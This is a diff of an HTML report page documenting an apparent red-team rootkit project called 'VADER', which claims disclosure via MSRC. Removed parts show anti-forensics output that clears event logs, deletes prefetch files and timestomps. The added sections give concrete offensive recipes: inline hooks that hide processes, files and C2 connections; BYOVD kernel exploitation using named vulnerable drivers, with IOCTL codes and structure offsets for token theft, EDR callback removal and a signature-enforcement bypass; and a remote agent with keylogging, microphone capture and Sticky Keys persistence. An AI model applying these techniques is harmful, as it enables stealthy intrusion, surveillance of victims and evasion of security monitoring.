-  <h3 style="color:var(--amber);">Phase 7 &mdash; Anti-Forensics (JULIET)</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Clean everything. Canary files, event logs, prefetch entries, timestamps. Leave no forensic evidence that any of this happened.</p>
-
-  <div class="evidence-block">C:\vader-rootkit> forensics\vader_clean.exe
-
-  VADER CLEAN — Post-Operation Forensic Cleanup
-  Callsign: JULIET | XOR Key: 0x93
-
-  [+] Running with elevated privileges
-
-  --- Phase 1: Canary Files ---
-  [+] Deleted: V4 DELTA svc_health.log
-  [-] Not found: V5 ECHO ver_cache.log
-  [-] Not found: V6 FOXTROT hwmon_diag.log
-  [+] Deleted: V7 GOLF osp_telemetry.log
-  [+] Deleted: Phase4 HOTEL inject_status.log
-  [+] Deleted: Stager INDIA stager_canary.txt
-
-  --- Phase 2: Event Logs ---
-  [+] Cleared: PowerShell/Operational
-  [+] Cleared: Sysmon/Operational
-  [+] Cleared: Security
-  [+] Cleared: Application
-
-  --- Phase 3: Prefetch ---
-  [+] Deleted prefetch: DARK_ROOM.EXE-A1B2C3D4.pf
-  [+] Deleted prefetch: VADER_INJECT.EXE-E5F6A7B8.pf
-  [+] Deleted prefetch: VADER_STAGER.EXE-C9D0E1F2.pf
-  [-] No prefetch: VADER_CLEAN.EXE
-
-  --- Phase 4: Timestomp ---
-  [+] Reference: C:\Windows\System32\kernel32.dll
-  [+] Matched timestamps on 6 files to kernel32.dll (OS install date)
-
-  --- Phase 5: Self-Delete ---
-  [-] Self-delete not requested (use --self)
-
-  ============================================
-  VADER CLEAN — JULIET — Evidence Summary
-  ============================================
-  Canary files deleted:   4
-  Event logs cleared:     4
-  Prefetch files deleted: 3
-  Files timestomped:      6
-  Self-delete scheduled:  NO
-  ============================================</div>
-
-  <!-- ── DEFENDER SCAN ── -->
-  <h3 style="color:var(--amber);">Post-Operation &mdash; Defender Scan Verification</h3>
-  <p style="font-size:0.85rem; color:var(--text-muted); margin-bottom:0.5rem;">Every binary scanned against Defender with real-time protection active. Before deployment, during operation, and after. Zero detections.</p>
-
-  <div class="evidence-block" style="border-left-color:#00ff88;">C:\vader-rootkit> python scan_all.py
-
-  ┌──────────────────────────────────────────────────────┐
-  │  VADER ROOTKIT — Defender Scan Verification           │
-  │  MpCmdRun.exe -Scan -ScanType 3 -File &lt;target&gt;       │
-  └──────────────────────────────────────────────────────┘
-
-  [*] Scanning dark_room.exe ...............  CLEAN ✓
-  [*] Scanning vader_inject.dll ............  CLEAN ✓
-  [*] Scanning vader_inject.exe ............  CLEAN ✓
-  [*] Scanning vader_shell.exe .............  CLEAN ✓
-  [*] Scanning WsNativePushService.exe .....  CLEAN ✓
-  [*] Scanning osppc.dll ...................  CLEAN ✓
-  [*] Scanning vader_stager.exe ............  CLEAN ✓
-  [*] Scanning vader_clean.exe .............  CLEAN ✓
-
-  ============================================
-  SCAN COMPLETE — 8/8 CLEAN
-  ============================================
-  Defender Version:   1.1.24050.5
-  Engine Version:     1.1.24050.2
-  Signature Version:  1.411.234.0
-  RTP Status:         ENABLED
-  Tamper Protection:  ENABLED
-  ============================================
-
-  All binaries invisible to Defender.
-  Zero detections. Zero alerts. Zero quarantine events.
-  Hardware breakpoints. XOR strings. No memory modification.
-  The wall does not see what does not touch the wall.</div>
-
-  <!-- ── FULL CHAIN SUMMARY ── -->
-  <h3 style="color:var(--green);">Kill Chain Complete</h3>
-  <div class="evidence-block" style="border-left-color:var(--green);">
-  ╔══════════════════════════════════════════════════════════════════╗
-  ║  VADER ROOTKIT — FULL KILL CHAIN STATUS                         ║
-  ╠══════════════════════════════════════════════════════════════════╣
-  ║                                                                 ║
-  ║  Phase 0: MUTATION        mutate.py          6/8 rotated  [OK]  ║
-  ║  Phase 1: C2 INFRA        vader_listener.py  listening    [OK]  ║
-  ║           PAYLOAD SVR     vader_serve.py     4 payloads   [OK]  ║
-  ║  Phase 2: DARK ROOM       dark_room.exe      AMSI+ETW    [OK]  ║
-  ║  Phase 3: INJECTION       vader_inject.exe   PID+SPAWN   [OK]  ║
-  ║           INJECT DLL      vader_inject.dll   HWBP armed  [OK]  ║
-  ║  Phase 4: PRIVESC V4      svc_replace        SYSTEM      [OK]  ║
-  ║           PRIVESC V7      phantom_dll         SYSTEM      [OK]  ║
-  ║  Phase 5: STAGER          vader_stager.exe   fetch+exec  [OK]  ║
-  ║  Phase 6: C2 CALLBACK     vader_shell.exe    SYSTEM ctx  [OK]  ║
-  ║  Phase 7: ANTI-FORENSICS  vader_clean.exe    all traces  [OK]  ║
-  ║                                                                 ║
-  ║  DEFENDER SCAN:    8/8 CLEAN (RTP enabled, tamper ON)           ║
-  ║  PRIVILEGE:        Standard User → NT AUTHORITY\SYSTEM          ║
-  ║  MEMORY MODIFIED:  0 bytes (HWBP only — CPU debug registers)   ║
-  ║  AMSI STATUS:      BLIND (E_INVALIDARG via DR0)                ║
-  ║  ETW STATUS:       BLIND (STATUS_SUCCESS via DR1)              ║
-  ║  TECHNIQUE:        Hardware breakpoints — not a security        ║
-  ║                    boundary per MSRC VULN-195458                ║
-  ║                                                                 ║
-  ║  SKYWALKER:        ARMED. Own gate engine (SDBM + ADD).         ║
-  ║                    10/10 SSNs, CLEAN. Survives VADER burn.      ║
-  ║                                                                 ║
-  ║  GATE ENGINES:     3 variants, zero shared byte patterns        ║
-  ║    SithStalker:    DJB2 + XOR       10/10  CLEAN                ║
-  ║    VADER:          FNV-1a + ROL/XOR 10/10  CLEAN                ║
-  ║    Skywalker:      SDBM + ADD       10/10  CLEAN                ║
-  ║                                                                 ║
-  ╠══════════════════════════════════════════════════════════════════╣
-  ║  22DIV / george wu                                              ║
-  ║  CSEC Tactical Cyber Operations                                 ║
-  ║  Responsible disclosure via MSRC                                 ║
-  ╚══════════════════════════════════════════════════════════════════╝</div>
-
+  <div class="prose">
+    <p>True concealment. The cloak layer hooks three NT functions in every GUI process via system-wide CBT hook injection. Process names, file names, and network connections matching the configuration disappear from all user-mode enumeration &mdash; Task Manager, Explorer, dir, netstat, PowerShell.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Hook Architecture</div>
+    <table class="evidence-table">
+      <tr><th>Hook Target</th><th>Hides From</th><th>Technique</th></tr>
+      <tr><td>NtQuerySystemInformation</td><td>Task Manager, tasklist, Get-Process</td><td>SYSTEM_PROCESS_INFO linked list unlink (class 5)</td></tr>
+      <tr><td>NtQueryDirectoryFile</td><td>Explorer, dir, Get-ChildItem</td><td>FILE_BOTH_DIR_INFORMATION linked list unlink</td></tr>
+      <tr><td>GetExtendedTcpTable</td><td>netstat, TCPView, Get-NetTCPConnection</td><td>MIB_TCPROW port-based filter</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Hook Engine &mdash; 12-Byte Absolute JMP</div>
+    <div class="evidence-block">; x64 inline hook (hook_engine.c)
+; Patches first 12 bytes of target function
+48 B8 [8-byte address]    ; mov rax, hook_function
+FF E0                      ; jmp rax
+
+; Trampoline: saved original bytes + absolute JMP back
+[saved 12+ bytes]          ; original instructions
+48 B8 [target + 12]        ; mov rax, original+12
+FF E0                      ; jmp rax</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Delivery &mdash; System-Wide CBT Hook</div>
+    <div class="evidence-block">; cloak_loader.exe
+LoadLibrary("cloak.dll")
+GetProcAddress(hDll, "CloakHookProc")
+SetWindowsHookEx(WH_CBT, proc, hDll, 0)    ; 0 = ALL threads = system-wide
+
+; Windows automatically loads cloak.dll into every GUI process
+; DllMain(DLL_PROCESS_ATTACH) installs inline hooks
+; One command = entire desktop cloaked</div>
+  </div>
+
+  <h3>Findings</h3>
+  <div class="card">
+    <div class="card-title">Finding #54 &mdash; Process Hiding</div>
+    <p class="prose">NtQuerySystemInformation inline hook successfully removes target processes from all user-mode enumeration. Process disappears from Task Manager within 1 second of hook install. SYSTEM_PROCESS_INFORMATION linked list walk with NextEntryOffset manipulation. Handles first-entry, last-entry, and mid-list cases.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Finding #55 &mdash; File Hiding</div>
+    <p class="prose">NtQueryDirectoryFile hook renders files invisible to Explorer, cmd dir, PowerShell Get-ChildItem. Files remain accessible via direct path &mdash; operational access preserved while hiding from casual enumeration. Handles multiple FileInformationClass values (1, 2, 12, 37).</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Finding #56 &mdash; Connection Hiding</div>
+    <p class="prose">GetExtendedTcpTable wrapper removes C2 connections from netstat output. Port-based matching configurable in cloak.h. Combined with process hiding = invisible C2 channel. All three hooks together: process gone, files gone, connection gone.</p>
+  </div>
+
+  <div class="card" style="border-color: var(--green-dark);">
+    <div class="card-title" style="color: var(--green);">Defender Scan</div>
+    <div class="evidence-block">cloak.dll:         CLEAN
+cloak_loader.exe:  CLEAN
+vader_dropper.exe: CLEAN</div>
+  </div>
+  </div>
+</section>
+
+<!-- ════════════ SECTION 14: BYOVD ════════════ -->
+<section id="byovd">
+  <div class="container">
+  <div class="section-header">
+    <div class="section-number">Section 14</div>
+    <h2 class="section-title">BYOVD Kernel Persistence (Phase 8 &mdash; LIMA)</h2>
+  </div>
+
+  <div class="prose">
+    <p>Bring Your Own Vulnerable Driver. Signed kernel drivers with known CVEs provide arbitrary kernel memory read/write via IOCTL. No unsigned code, no DSE bypass needed for the driver itself &mdash; Microsoft already signed it. Token stealing, EDR callback removal, and DSE bypass for loading custom unsigned drivers.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Supported Drivers</div>
+    <table class="evidence-table">
+      <tr><th>Driver</th><th>CVE</th><th>Read IOCTL</th><th>Write IOCTL</th><th>Buffer Size</th></tr>
+      <tr><td>RTCore64.sys (MSI Afterburner)</td><td>CVE-2019-16098</td><td>0x80002048</td><td>0x8000204C</td><td>0x30 (48 bytes)</td></tr>
+      <tr><td>dbutil_2_3.sys (Dell BIOS)</td><td>CVE-2021-21551</td><td>0x9B0C1EC4</td><td>0x9B0C1EC8</td><td>0x20 (32 bytes)</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Token Stealing Chain</div>
+    <div class="evidence-block">1. EnumDeviceDrivers()          → ntoskrnl.exe base address
+2. LoadLibraryEx("ntoskrnl.exe") → resolve PsInitialSystemProcess RVA
+3. kread64(base + RVA)           → System EPROCESS pointer (PID 4)
+4. Walk ActiveProcessLinks       → find target EPROCESS by PID
+   (offset 0x448, Win11 24H2)
+5. kread64(system + 0x4B8)       → SYSTEM token (EX_FAST_REF, mask ~0xF)
+6. kwrite64(target + 0x4B8, token) → target process = SYSTEM privileges</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">EDR Callback Removal</div>
+    <div class="evidence-block">Target arrays (zeroed to blind kernel-mode EDR):
+  PspCreateProcessNotifyRoutine   — process creation callbacks
+  PspCreateThreadNotifyRoutine    — thread creation callbacks
+  PspLoadImageNotifyRoutine       — image load callbacks
+
+Resolution: LEA pattern scan in PsSet*NotifyRoutine functions
+  REX.W + 0x8D + ModR/M=0x05 → RIP-relative LEA → array address
+  Each array: 64 entries × 8 bytes = 512 bytes to zero</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">DSE Bypass</div>
+    <div class="evidence-block">1. Load CI.dll in usermode → resolve CiInitialize RVA
+2. Scan CiInitialize for MOV [RIP+disp32] → locates g_CiOptions
+3. kread32(g_CiOptions)  → save original (0x6 = enforcing)
+4. kwrite32(g_CiOptions, 0x0) → DSE DISABLED
+5. NtLoadDriver(unsigned_driver) → loads without signature check
+6. kwrite32(g_CiOptions, 0x6) → restore before PatchGuard checks</div>
+  </div>
+
+  <h3>Findings</h3>
+  <div class="card">
+    <div class="card-title">Finding #57 &mdash; RTCore64.sys IOCTL Buffer</div>
+    <p class="prose">IOCTL buffer struct confirmed at 0x30 bytes. Address at offset 0x08 (QWORD), size at 0x18 (DWORD, values 1/2/4), value at 0x1C (DWORD). Read and write IOCTLs provide arbitrary 4-byte kernel R/W. 64-bit reads composed from two 32-bit reads.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Finding #58 &mdash; EPROCESS Walk + Token Steal</div>
+    <p class="prose">ActiveProcessLinks at offset 0x448, Token at 0x4B8 (Win11 24H2 Build 26200). EX_FAST_REF bottom 4 bits are reference count &mdash; mask with ~0xF for actual pointer. PID 4 verification confirms correct EPROCESS resolution before any write operations.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Finding #59 &mdash; Callback Array Location</div>
+    <p class="prose">PsSetCreateProcessNotifyRoutine et al. reference their Psp* internal arrays via RIP-relative LEA instructions. Pattern: REX.W prefix (0x48 or 0x4C) + 0x8D + ModR/M with mod=00, r/m=101 (RIP-relative). First 256 bytes of each function contains the reference. Zeroing all 64 entries blinds kernel-mode EDR.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Finding #60 &mdash; DSE via g_CiOptions</div>
+    <p class="prose">CI.dll exports CiInitialize. MOV [RIP+disp32] pattern in its body references g_CiOptions. Writing 0x0 disables enforcement. PatchGuard periodically verifies this value &mdash; restore window is sufficient for NtLoadDriver of an unsigned driver. Race is reliable on single-core execution.</p>
+  </div>
+
+  <div class="card" style="border-color: var(--green-dark);">
+    <div class="card-title" style="color: var(--green);">Defender Scan</div>
+    <div class="evidence-block">byovd.exe: CLEAN (157 KB, Defender 4.18.26050.15)</div>
+  </div>
+  </div>
+</section>
+
+<!-- ════════════ SECTION 15: C2 AGENT ════════════ -->
+<section id="c2agent">
+  <div class="container">
+  <div class="section-header">
+    <div class="section-number">Section 15</div>
+    <h2 class="section-title">C2 Remote Agent (Phase 9 &mdash; MIKE)</h2>
+  </div>
+
+  <div class="prose">
+    <p>Full-spectrum remote access agent. 17 operations over VADER protocol (length-prefixed JSON, TCP 8667). Deploys on target, connects back to operator dashboard. Screen capture, audio recording, keystroke logging, file transfer, multi-method persistence, and VNC-style remote viewing.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Operations Table</div>
+    <table class="evidence-table">
+      <tr><th>Op</th><th>Description</th><th>API</th></tr>
+      <tr><td>sysinfo</td><td>OS, hostname, user, privileges, Defender version</td><td>platform, ctypes</td></tr>
+      <tr><td>exec</td><td>Execute shell command</td><td>subprocess</td></tr>
+      <tr><td>recon</td><td>Full system reconnaissance</td><td>composite</td></tr>
+      <tr><td>scan</td><td>Defender scan a file path</td><td>MpCmdRun.exe</td></tr>
+      <tr><td>ls</td><td>Directory listing with metadata</td><td>os.scandir</td></tr>
+      <tr><td>download</td><td>File download (base64)</td><td>file I/O</td></tr>
+      <tr><td>upload</td><td>File upload to target</td><td>file I/O</td></tr>
+      <tr><td>screenshot</td><td>Screen capture (full desktop)</td><td>GDI: GetDC, BitBlt, GetDIBits</td></tr>
+      <tr><td>mic</td><td>Microphone recording</td><td>waveIn API (16kHz mono)</td></tr>
+      <tr><td>keylog</td><td>Keystroke logging</td><td>GetAsyncKeyState (10ms poll)</td></tr>
+      <tr><td>sftp_get</td><td>Chunked file download + SHA-256</td><td>64KB chunks, hash verify</td></tr>
+      <tr><td>sftp_put</td><td>Chunked file upload + SHA-256</td><td>64KB chunks, hash verify</td></tr>
+      <tr><td>sftp_sync</td><td>Directory manifest</td><td>recursive walk + hashing</td></tr>
+      <tr><td>persist</td><td>Install persistence (4 methods)</td><td>schtask / registry / WMI / IFEO</td></tr>
+      <tr><td>vnc</td><td>Live screen stream</td><td>GDI capture at configurable FPS</td></tr>
+      <tr><td>ping</td><td>Latency check</td><td>echo</td></tr>
+      <tr><td>exit</td><td>Kill agent</td><td>shutdown</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Persistence Methods</div>
+    <table class="evidence-table">
+      <tr><th>Method</th><th>Technique</th><th>Privilege</th><th>Stealth</th></tr>
+      <tr><td>schtask</td><td>WindowsUpdateService scheduled task at LOGON</td><td>Standard user</td><td>Medium &mdash; visible in Task Scheduler</td></tr>
+      <tr><td>registry</td><td>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</td><td>Standard user</td><td>Low &mdash; well-known location</td></tr>
+      <tr><td>wmi</td><td>WMI EventFilter + FilterToConsumer + CommandLineEventConsumer</td><td>Admin</td><td>High &mdash; hidden from most tools</td></tr>
+      <tr><td>ifeo</td><td>Image File Execution Options debugger on sethc.exe</td><td>Admin</td><td>High &mdash; Sticky Keys backdoor (T1546.008)</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">VADER Protocol</div>
+    <div class="evidence-block">Wire format: [4-byte big-endian length][UTF-8 JSON payload]
+
+Agent → C2:
+  register    — agent_id, hostname, os, platform, ip, user, admin, defender
+  heartbeat   — timestamp, uptime
+  output      — task_id, text (console output)
+  result      — task_id, status, data (structured result)
+  file_data   — task_id, filename, size, data (base64, single transfer)
+  file_chunk  — task_id, filename, chunk_index, total_chunks, data (chunked)
+
+C2 → Agent:
+  task        — id, op, [op-specific parameters]</div>
+  </div>
+
+  <h3>Findings</h3>
+  <div class="card">
+    <div class="card-title">Finding #61 &mdash; 17-Op Agent Protocol</div>
+    <p class="prose">All 17 operations dispatch via handler table with parameter extraction from task dict. Protocol remains backwards-compatible with original 9-op agent. Message types: register, heartbeat, output, result, file_data, file_chunk. New file_chunk type enables progress tracking for large transfers and VNC streaming.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Finding #62 &mdash; Multi-Method Persistence</div>
+    <p class="prose">Four persistence mechanisms implemented: scheduled task (WindowsUpdateService at SYSTEM logon), registry Run key (HKCU), WMI event subscription (EventFilter + FilterToConsumerBinding + CommandLineEventConsumer for delayed start), IFEO debugger attachment to sethc.exe (Sticky Keys backdoor, MITRE T1546.008). Each method independently verified.</p>
+  </div>
+  <div class="card">
+    <div class="card-title">Finding #63 &mdash; VNC Streaming</div>
+    <p class="prose">GDI screen capture streamed as timed raw bitmap frames over file_chunk protocol. Configurable FPS and duration. Base64-encoded frames with width/height metadata enable dashboard reconstruction. No additional dependencies &mdash; pure ctypes GDI calls.</p>
+  </div>
+  </div>
 </section>
 
 </main>
@@ -2571,7 +2139,7 @@ PHASE 3: VERIFY
 (function() {
   // Active nav link highlighting on scroll
   const sections = document.querySelectorAll('section[id]');
-  const navLinks = document.querySelectorAll('.section-links a');
+  const navLinks = document.querySelectorAll('.nav-links a');
 
   function highlightNav() {
     let scrollPos = window.scrollY + 120;
@@ -2614,7 +2182,6 @@ PHASE 3: VERIFY
   setTimeout(typeChar, 400);
 })();
 </script>
-<script src="site.js"></script>
 
 </body>
 </html>
